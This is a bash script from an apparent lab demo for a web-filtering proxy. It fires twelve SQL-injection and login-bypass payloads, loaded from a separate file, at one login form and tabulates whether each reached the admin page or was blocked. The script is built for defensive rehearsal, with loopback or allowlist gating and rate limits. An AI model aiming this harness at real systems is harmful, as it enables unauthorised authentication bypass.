#!/usr/bin/env bash
# HDD HK1 demo attack script (lab/rehearsal only) - SQL injection on one login form.
#
# Sends the twelve demo payloads from lab/demo/payloads.tsv (the six mandated
# SQL-injection payloads M1-M6 of docs/SPEC.md C4.1/E1.1 plus the six auth-bypass
# forms named in docs/COLLAB.md) to ONE login endpoint, as urlencoded login POSTs
# and as GET query strings. It prints every request with its HTTP status, whether
# the response looks like the admin page, and a final reached-admin/blocked
# yes/no table. Rate is capped at 2 requests/second (500 ms spacing).
#
# SAFETY, hard-coded:
#   * the target host must be loopback (127.0.0.0/8, ::1, localhost), which is
#     always allowed for the local rehearsal, OR be listed in the operator-created
#     lab/demo/targets.allow (one host per line); otherwise this script refuses
#     BEFORE sending anything;
#   * only the login path is requested: no scanning, no other paths, no other
#     attack classes, never a third-party host;
#   * if the target or the operator is not authorised, do not run this script.
#
# Lab only, not shipped. It demonstrates a real SQL injection; it is not a
# security product and makes no protection claim.
#
# Usage:
#   ./lab/demo/attack.sh [--target URL] [--login-path /admin/login]
#                        [--user-field username] [--pass-field password]
#                        [--kind auto|direct|proxy|target] [--dashboard-url URL] [--help]
#
# Default target: $HDD_ATTACK_TARGET or http://127.0.0.1:8080 (the local HDD proxy).
# For the "before" comparison use http://127.0.0.1:8082 (the direct lab shop origin; the older Python lab app is 8081).
#
# Requires bash 3.2+ and curl. Windows twin: lab/demo/attack.ps1.
# Exit codes: 0 ran, 2 usage/prerequisite, 3 refused by allowlist, 4 target invalid.

set -u
set -o pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD_FILE="${SCRIPT_DIR}/payloads.tsv"
ALLOW_FILE="${SCRIPT_DIR}/targets.allow"

TARGET_URL="${HDD_ATTACK_TARGET:-http://127.0.0.1:8080}"
LOGIN_PATH=""
USER_FIELD="username"
PASS_FIELD="password"
KIND="auto"
DASHBOARD_URL=""

usage() {
    cat <<'EOF'
HDD HK1 demo attack script (lab/rehearsal only) - SQL injection on one login form.

Usage:
  ./lab/demo/attack.sh [--target URL] [--login-path /admin/login]
                       [--user-field username] [--pass-field password]
                       [--kind auto|direct|proxy|target] [--dashboard-url URL] [--help]

Examples:
  # direct lab origin: expected "reached admin: yes" for many payloads
  ./lab/demo/attack.sh --target http://127.0.0.1:8082
  # through HDD in block mode: expected 403 + Ray ID and a ban for all twelve
  ./lab/demo/attack.sh --target http://127.0.0.1:8080

Safety: the target host must be loopback or listed in lab/demo/targets.allow
(one operator-authorised host per line). Only the login endpoint is requested;
the script never scans and never touches a third-party host. Never run it on a
site you are not authorised to test. This is a lab demo, not a security product.
EOF
}

die() {
    local code="$1"
    shift
    printf 'ERROR: %s\n' "$*" >&2
    exit "$code"
}

# --- arguments ---------------------------------------------------------------
while [ "$#" -gt 0 ]; do
    case "$1" in
        --target|--target-url|-t)
            [ "$#" -ge 2 ] || die 2 "$1 needs a value"
            TARGET_URL="$2"
            shift 2
            ;;
        --login-path)
            [ "$#" -ge 2 ] || die 2 "$1 needs a value"
            LOGIN_PATH="$2"
            shift 2
            ;;
        --user-field)
            [ "$#" -ge 2 ] || die 2 "$1 needs a value"
            USER_FIELD="$2"
            shift 2
            ;;
        --pass-field)
            [ "$#" -ge 2 ] || die 2 "$1 needs a value"
            PASS_FIELD="$2"
            shift 2
            ;;
        --kind)
            [ "$#" -ge 2 ] || die 2 "$1 needs a value"
            KIND="$2"
            shift 2
            ;;
        --dashboard-url)
            [ "$#" -ge 2 ] || die 2 "$1 needs a value"
            DASHBOARD_URL="$2"
            shift 2
            ;;
        --help|-h)
            usage
            exit 0
            ;;
        *)
            die 2 "unknown argument: $1 (use --help)"
            ;;
    esac
done

case "$KIND" in
    auto|direct|proxy|target) ;;
    *) die 2 "invalid --kind '$KIND' (auto, direct, proxy or target)" ;;
esac

# --- 1. validate the target URL before doing anything -----------------------
case "$TARGET_URL" in
    http://*|https://*) ;;
    *) die 4 "target URL must start with http:// or https:// (got '$TARGET_URL')" ;;
esac
SCHEME="${TARGET_URL%%://*}"
REST="${TARGET_URL#*://}"
AUTHORITY="${REST%%[/?#]*}"
if [ -z "$AUTHORITY" ]; then
    die 4 "target URL has no host: '$TARGET_URL'"
fi
if [ "${AUTHORITY#*@}" != "$AUTHORITY" ]; then
    die 4 "target URL must not contain embedded credentials (no secrets in URLs)."
fi
HOST=""
PORT=""
DEFAULT_PORT=80
[ "$SCHEME" = "https" ] && DEFAULT_PORT=443
case "$AUTHORITY" in
    \[*\]:*)
        HOST="${AUTHORITY%%]*}"
        HOST="${HOST#\[}"
        PORT="${AUTHORITY##*:}"
        case "$PORT" in
            ''|*[!0-9]*) die 4 "invalid port in target URL: '$PORT'" ;;
        esac
        ;;
    \[*\])
        HOST="${AUTHORITY#\[}"
        HOST="${HOST%\]}"
        PORT="$DEFAULT_PORT"
        ;;
    *:*)
        HOST="${AUTHORITY%%:*}"
        PORT="${AUTHORITY##*:}"
        case "$PORT" in
            ''|*[!0-9]*) die 4 "invalid port in target URL: '$PORT'" ;;
        esac
        ;;
    *)
        HOST="$AUTHORITY"
        PORT="$DEFAULT_PORT"
        ;;
esac
[ -n "$HOST" ] || die 4 "target URL has no host: '$TARGET_URL'"

is_loopback="no"
case "$HOST" in
    localhost|::1) is_loopback="yes" ;;
    *)
        case "$HOST" in
            127.*)
                case "$HOST" in
                    *[!0-9.]*) ;;
                    *) is_loopback="yes" ;;
                esac
                ;;
        esac
        ;;
esac

# --- 2. resolve the mode (direct origin vs through HDD) ---------------------
if [ "$KIND" = "auto" ]; then
    if [ "$is_loopback" = "yes" ] && { [ "$PORT" = "8082" ] || [ "$PORT" = "8081" ]; }; then
        KIND="direct"
        KIND_DESC="auto: loopback port 8082/8081 -> direct lab origin"
    elif [ "$is_loopback" = "yes" ] && [ "$PORT" = "8080" ]; then
        KIND="proxy"
        KIND_DESC="auto: loopback port 8080 -> through HDD"
    else
        KIND="target"
        KIND_DESC="auto: not a local rehearsal port -> generic target"
    fi
else
    KIND_DESC="explicit --kind ${KIND}"
fi

# --- 3. allowlist gate: refuse before the first request ---------------------
if [ "$is_loopback" = "yes" ]; then
    ALLOW_NOTE="loopback host -> always allowed (no lab/demo/targets.allow entry needed)"
else
    matched="no"
    if [ -f "$ALLOW_FILE" ]; then
        while IFS= read -r line || [ -n "$line" ]; do
            line="${line%%#*}"
            line="$(printf '%s' "$line" | tr -d '\r' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
            [ -n "$line" ] || continue
            if [ "$(printf '%s' "$line" | tr '[:upper:]' '[:lower:]')" = "$(printf '%s' "$HOST" | tr '[:upper:]' '[:lower:]')" ]; then
                matched="yes"
                break
            fi
        done < "$ALLOW_FILE"
    fi
    if [ "$matched" != "yes" ]; then
        printf '\nREFUSED: target host %s is not loopback and is not listed in:\n  %s\n' "$HOST" "$ALLOW_FILE" >&2
        printf '  Create that file with one operator-authorised host per line, for example:\n    %s\n' "$HOST" >&2
        printf '  (see lab/demo/targets.allow.example). Loopback hosts are always allowed.\n  No request was sent.\n' >&2
        exit 3
    fi
    ALLOW_NOTE="host listed in ${ALLOW_FILE}"
fi

# --- 4. resolve the login endpoint and field names --------------------------
case "$USER_FIELD" in
    *[!A-Za-z0-9_\[\]-]*) die 2 "invalid --user-field '$USER_FIELD' (letters, digits, _ - [ ] only)." ;;
esac
case "$PASS_FIELD" in
    *[!A-Za-z0-9_\[\]-]*) die 2 "invalid --pass-field '$PASS_FIELD' (letters, digits, _ - [ ] only)." ;;
esac
if [ -n "$LOGIN_PATH" ]; then
    LOGIN_PATH="$LOGIN_PATH"
else
    PATH_PART="${REST#"$AUTHORITY"}"
    PATH_PART="${PATH_PART%%\?*}"
    PATH_PART="${PATH_PART%%#*}"
    if [ -n "$PATH_PART" ] && [ "$PATH_PART" != "/" ]; then
        LOGIN_PATH="$PATH_PART"
    else
        LOGIN_PATH="/admin/login"
    fi
fi
case "$LOGIN_PATH" in
    /*) ;;
    *) LOGIN_PATH="/${LOGIN_PATH}" ;;
esac
LOGIN_URL="${SCHEME}://${AUTHORITY}${LOGIN_PATH}"

# --- 5. load the payload catalogue and the HTTP client ----------------------
[ -f "$PAYLOAD_FILE" ] || die 2 "payload catalogue not found: $PAYLOAD_FILE"
command -v curl >/dev/null 2>&1 || die 2 "curl not found on PATH; install curl (or use the Windows attack.ps1)."
command -v sed >/dev/null 2>&1 || die 2 "sed not found on PATH."
command -v tr >/dev/null 2>&1 || die 2 "tr not found on PATH."

PAYLOAD_COUNT=0
MANDATED_COUNT=0
BYPASS_COUNT=0
payload_ids=()
payload_groups=()
payload_values=()
while IFS=$'\t' read -r pid pgroup pvalue || [ -n "${pid:-}" ]; do
    pid="${pid%$'\r'}"
    pgroup="${pgroup%$'\r'}"
    pvalue="${pvalue%$'\r'}"
    [ -n "${pid// /}" ] || continue
    case "$pid" in
        '#'*) continue ;;
    esac
    case "$pid" in
        M[1-6]|B[1-6]) ;;
        *) die 2 "malformed payload id '$pid' in $PAYLOAD_FILE (expected M1-M6 or B1-B6)" ;;
    esac
    [ -n "$pvalue" ] || die 2 "empty payload for id '$pid' in $PAYLOAD_FILE"
    payload_ids[PAYLOAD_COUNT]="$pid"
    payload_groups[PAYLOAD_COUNT]="$pgroup"
    payload_values[PAYLOAD_COUNT]="$pvalue"
    PAYLOAD_COUNT=$((PAYLOAD_COUNT + 1))
    case "$pgroup" in
        mandated) MANDATED_COUNT=$((MANDATED_COUNT + 1)) ;;
        auth-bypass) BYPASS_COUNT=$((BYPASS_COUNT + 1)) ;;
        *) die 2 "payload '$pid' has unknown group '$pgroup' in $PAYLOAD_FILE" ;;
    esac
done < "$PAYLOAD_FILE"
if [ "$MANDATED_COUNT" -ne 6 ] || [ "$BYPASS_COUNT" -ne 6 ]; then
    die 2 "payload catalogue needs 6 mandated + 6 auth-bypass rows; found ${MANDATED_COUNT} + ${BYPASS_COUNT} in $PAYLOAD_FILE"
fi
TOTAL_REQUESTS=$((PAYLOAD_COUNT * 2))

# --- 6. print exactly what will happen -------------------------------------
printf '\n'
printf '%s\n' '========================================================================================================'
printf '%s\n' 'HDD HK1 demo attack script - SQL injection on a login form (lab/rehearsal only)'
printf '%s\n' '========================================================================================================'
printf '%s\n' 'Only the 12 payloads below, only the login endpoint, only an operator-authorised host.'
printf '%s\n' 'No scanning. No other paths. No other attack classes. Rate capped at 2 requests/second.'
printf '\n'
printf 'target:    %s\n' "$TARGET_URL"
printf 'kind:      %s (%s)\n' "$KIND" "$KIND_DESC"
printf 'login:     %s  fields: %s/%s\n' "$LOGIN_URL" "$USER_FIELD" "$PASS_FIELD"
printf 'allowlist: %s\n' "$ALLOW_NOTE"
printf 'payloads:  %s (%s mandated M1-M6 + %s auth-bypass B1-B6) x 2 shapes = %s requests\n' \
    "$PAYLOAD_COUNT" "$MANDATED_COUNT" "$BYPASS_COUNT" "$TOTAL_REQUESTS"
printf '%s\n' 'rate:      2 requests/second maximum (500 ms spacing between requests)'
printf 'script:    %s\n' "${BASH_SOURCE[0]}"
printf 'catalogue: %s\n' "$PAYLOAD_FILE"

TMP_DIR="$(mktemp -d "${TMPDIR:-/tmp}/hdd-attack.XXXXXX")" || die 2 "cannot create a temporary directory"
cleanup() { rm -rf "$TMP_DIR"; }
trap cleanup EXIT

# Percent-encode one payload for an urlencoded form body / query string.
# The catalogue payloads are ASCII, so a byte-wise encoder is exact.
urlencode() {
    local text="$1" out="" char hex i
    for (( i = 0; i < ${#text}; i++ )); do
        char="${text:i:1}"
        case "$char" in
            [A-Za-z0-9.~_-]) out="${out}${char}" ;;
            ' ') out="${out}%20" ;;
            *) printf -v hex '%%%02X' "'${char}"; out="${out}${hex}" ;;
        esac
    done
    printf '%s' "$out"
}

# --- classification helpers --------------------------------------------------
is_admin_page() {
    local file="$1"
    # Lab shop admin dashboard markers (CoreByte): the dashboard has "Demo data only"
    # and the admin shell title "Dashboard | CoreByte Admin"; the login page has
    # neither. The older Python lab page markers are kept for stack: python profiles.
    if grep -Eqi 'Demo data only' "$file" 2>/dev/null; then return 0; fi
    if grep -Eqi '<title>Dashboard \| CoreByte Admin</title>' "$file" 2>/dev/null; then return 0; fi
    if grep -Eqi 'data-page="admin"' "$file" 2>/dev/null; then return 0; fi
    if grep -Eqi '<h1>[[:space:]]*admin panel[[:space:]]*</h1>' "$file" 2>/dev/null; then return 0; fi
    return 1
}
is_block_page() {
    local file="$1"
    grep -Eqi 'access denied|your request looked like an attack|blocked by hdd' "$file" 2>/dev/null
}
extract_ray_id() {
    local file="$1"
    grep -Eo '[0-9a-f]{16}-HDD1' "$file" 2>/dev/null | head -n 1
}
short_text() {
    local text="$1"
    local width=30
    if [ "${#text}" -le "$width" ]; then
        printf '%s' "$text"
    else
        printf '%s~' "$(printf '%s' "$text" | cut -c1-29)"
    fi
}
table_cell() { # status admin blockpage ray kind -> cell text
    local status="$1" admin="$2" blockpage="$3" ray="$4" kind="$5"
    if [ "$status" -lt 0 ]; then
        printf 'no (request error)'
        return
    fi
    case "$kind" in
        direct)
            if [ "$admin" = "yes" ]; then printf 'YES'; return; fi
            if [ "$status" -eq 500 ]; then printf 'no (500 SQL error)'; return; fi
            if [ "$status" -eq 401 ]; then printf 'no (401 rejected)'; return; fi
            if [ "$blockpage" = "yes" ]; then printf 'no (block page)'; return; fi
            printf 'no (HTTP %s)' "$status"
            ;;
        proxy)
            if [ "$admin" = "yes" ]; then printf 'NO - ADMIN REACHED'; return; fi
            if [ "$status" -eq 403 ] || [ "$status" -eq 429 ]; then printf 'YES (%s)' "$status"; return; fi
            printf 'no (HTTP %s)' "$status"
            ;;
        *)
            if [ "$admin" = "yes" ]; then printf 'ADMIN REACHED'; return; fi
            if [ "$status" -eq 403 ] || [ "$status" -eq 429 ]; then printf 'blocked (%s)' "$status"; return; fi
            printf 'no (HTTP %s)' "$status"
            ;;
    esac
}

post_cells=()
get_cells=()
post_admin=0
get_admin=0
post_blocked=0
get_blocked=0
transport_errors=0
ray_ids_file="$TMP_DIR/ray-ids.txt"
: > "$ray_ids_file"
request_number=0
overall_start=$SECONDS

for shape in POST GET; do
    printf '\n--- %s login attempts ---\n' "$shape"
    idx=0
    while [ "$idx" -lt "$PAYLOAD_COUNT" ]; do
        pid="${payload_ids[$idx]}"
        pvalue="${payload_values[$idx]}"
        request_number=$((request_number + 1))
        encoded="$(urlencode "$pvalue")"
        encoded_form="${USER_FIELD}=${encoded}&${PASS_FIELD}=${encoded}"
        body_file="$TMP_DIR/body-${request_number}"
        error_file="$TMP_DIR/error-${request_number}"
        cookie_jar="$TMP_DIR/cookies-${request_number}"
        request_url="$LOGIN_URL"
        [ "$shape" = "GET" ] && request_url="${LOGIN_URL}?${encoded_form}"
        curl_args=(-sS -o "$body_file" -w '%{http_code}' -L --max-redirs 5 -c "$cookie_jar" -b "$cookie_jar" -m 15
            -H 'Accept: text/html' -A 'hdd-hk1-demo-attack/1.0')
        [ "$shape" = "POST" ] && curl_args+=(--data "$encoded_form")
        curl_args+=("$request_url")
        status="$(curl "${curl_args[@]}" 2>"$error_file")"
        curl_exit=$?
        curl_error=""
        if [ -s "$error_file" ]; then
            curl_error="$(head -n 1 "$error_file")"
        fi
        admin="no"
        blockpage="no"
        ray=""
        suffix=""
        if [ "$curl_exit" -ne 0 ] || [ -z "$status" ]; then
            status=-1
            transport_errors=$((transport_errors + 1))
            printf '[%2d/%d] %-4s %-3s "%s" -> request failed (curl exit %s)\n' \
                "$request_number" "$TOTAL_REQUESTS" "$shape" "$pid" "$pvalue" "$curl_exit"
            if [ -n "$curl_error" ]; then
                printf '      %s\n' "$curl_error"
            fi
        else
            if is_admin_page "$body_file"; then admin="yes"; suffix="  ->  admin page: YES"; fi
            if is_block_page "$body_file"; then blockpage="yes"; fi
            ray="$(extract_ray_id "$body_file")"
            if [ -z "$suffix" ] && [ -n "$ray" ]; then suffix="  ->  Ray ID: ${ray}"; fi
            if [ -z "$suffix" ] && [ "$blockpage" = "yes" ]; then suffix="  ->  HDD block page text: YES (no Ray ID parsed)"; fi
            if [ -z "$suffix" ] && [ "$status" -eq 500 ]; then suffix="  ->  SQL error (dialect/syntax)"; fi
            printf '[%2d/%d] %-4s %-3s "%s" -> HTTP %s%s\n' \
                "$request_number" "$TOTAL_REQUESTS" "$shape" "$pid" "$pvalue" "$status" "$suffix"
            [ -n "$ray" ] && printf '%s\n' "$ray" >> "$ray_ids_file"
        fi
        if [ "$shape" = "POST" ]; then
            post_cells[idx]="$(table_cell "$status" "$admin" "$blockpage" "$ray" "$KIND")"
            [ "$admin" = "yes" ] && post_admin=$((post_admin + 1))
            if [ "$admin" != "yes" ] && { [ "$status" -eq 403 ] || [ "$status" -eq 429 ]; }; then
                post_blocked=$((post_blocked + 1))
            fi
        else
            get_cells[idx]="$(table_cell "$status" "$admin" "$blockpage" "$ray" "$KIND")"
            [ "$admin" = "yes" ] && get_admin=$((get_admin + 1))
            if [ "$admin" != "yes" ] && { [ "$status" -eq 403 ] || [ "$status" -eq 429 ]; }; then
                get_blocked=$((get_blocked + 1))
            fi
        fi
        idx=$((idx + 1))
        if [ "$request_number" -lt "$TOTAL_REQUESTS" ]; then
            sleep 0.5
        fi
    done
done

elapsed=$((SECONDS - overall_start))

# --- 7. final yes/no table ---------------------------------------------------
case "$KIND" in
    direct) title='direct origin: reached admin yes/no per payload' ;;
    proxy) title='through HDD: blocked yes/no per payload' ;;
    *) title='target: outcome per payload (admin reached or blocked, honestly as observed)' ;;
esac
printf '\n%s\n' '========================================================================================================'
printf '%s\n' "$title"
printf '%s\n' '========================================================================================================'
printf '%-3s %-11s %-30s %-24s %-24s\n' 'id' 'group' 'payload' 'POST' 'GET'
printf '%s\n' '--------------------------------------------------------------------------------------------------------'
idx=0
while [ "$idx" -lt "$PAYLOAD_COUNT" ]; do
    printf '%-3s %-11s %-30s %-24s %-24s\n' \
        "${payload_ids[$idx]}" "${payload_groups[$idx]}" "$(short_text "${payload_values[$idx]}")" \
        "${post_cells[$idx]}" "${get_cells[$idx]}"
    idx=$((idx + 1))
done
printf '%s\n' '--------------------------------------------------------------------------------------------------------'
unique_rays=0
if [ -s "$ray_ids_file" ]; then
    unique_rays="$(sort -u "$ray_ids_file" | wc -l | tr -d ' ')"
fi
rate_note='500 ms minimum spacing between requests (at most 2 starts in any second)'
printf '\n'
case "$KIND" in
    direct)
        printf 'direct origin: reached admin POST %s/%s, GET %s/%s (%s requests in %ss; %s)\n' \
            "$post_admin" "$PAYLOAD_COUNT" "$get_admin" "$PAYLOAD_COUNT" "$request_number" "$elapsed" "$rate_note"
        if [ $((post_admin + get_admin)) -gt 0 ]; then
            printf '%s\n' 'Interpretation: at least one payload reached the admin page WITHOUT HDD. That is the vulnerability the demo is about.'
        else
            printf '%s\n' 'Interpretation: no payload reached the admin page. Check the target is the vulnerable origin and the field names are right.'
        fi
        if [ $((post_admin + get_admin)) -lt $((PAYLOAD_COUNT * 2)) ]; then
            printf '%s\n' "Note: the remaining payloads fail here for engine/query-shape reasons, not because of HDD (the lab shop hashes the password, so M2's separate-field tautology does not match; M4 and B4 use a hash comment that SQLite does not support; B3 has parentheses this query does not have; B5 runs but does not bypass)."
            printf '%s\n' '      docs/SPEC.md E1.1 and P28 record that mandated payloads differ in dialect validity on a given endpoint;'
            printf '%s\n' '      that is expected and is recorded here, not hidden. HDD must still block all twelve by intent.'
        fi
        printf '\n%s\n' 'Next (the comparison): start the stack and run the same payloads through HDD:'
        printf '%s\n' '  npm run dev            # in another terminal'
        printf '%s\n' '  npm run attack            # uses the proxy URL printed by npm run dev'
        ;;
    proxy)
        printf 'through HDD: blocked POST %s/%s, GET %s/%s (%s requests in %ss; %s)\n' \
            "$post_blocked" "$PAYLOAD_COUNT" "$get_blocked" "$PAYLOAD_COUNT" "$request_number" "$elapsed" "$rate_note"
        printf 'Ray IDs seen: %s\n' "$unique_rays"
        if [ $((post_admin + get_admin)) -gt 0 ]; then
            printf '%s\n' 'WARNING: at least one payload reached the admin page THROUGH HDD. The site is not protected on this path (R-34); do not claim protection.'
        else
            printf '%s\n' 'Interpretation: no payload reached the admin page through HDD. Bans persist for the configured TTL; unban from the dashboard or wait.'
        fi
        if [ -n "$DASHBOARD_URL" ]; then
            printf '\nDashboard (bans + events): %s\n' "$DASHBOARD_URL"
        else
            printf '\n%s\n' 'Dashboard (bans + events): the admin listener URL printed by npm run dev (9090 by default)'
        fi
        ;;
    *)
        printf 'target: admin reached POST %s/%s, GET %s/%s; blocked (403/429) POST %s/%s, GET %s/%s (%s requests in %ss; %s)\n' \
            "$post_admin" "$PAYLOAD_COUNT" "$get_admin" "$PAYLOAD_COUNT" "$post_blocked" "$PAYLOAD_COUNT" "$get_blocked" "$PAYLOAD_COUNT" \
            "$request_number" "$elapsed" "$rate_note"
        printf '%s\n' 'Interpretation: confirm whether this target is the direct origin or the HDD-protected entry point;'
        printf '%s\n' '      use --kind direct or --kind proxy to get the matching yes/no interpretation explicitly.'
        ;;
esac
if [ "$unique_rays" -gt 0 ]; then
    printf 'first Ray ID observed: %s\n' "$(sort -u "$ray_ids_file" | head -n 1)"
fi
if [ "$transport_errors" -gt 0 ]; then
    printf 'Transport errors: %s. Check the URL, the port and that the service is running.\n' "$transport_errors"
fi
printf '%s\n' 'No scanning was performed: only the login endpoint above was requested.'
if [ "$transport_errors" -eq "$request_number" ]; then
    exit 1
fi
exit 0
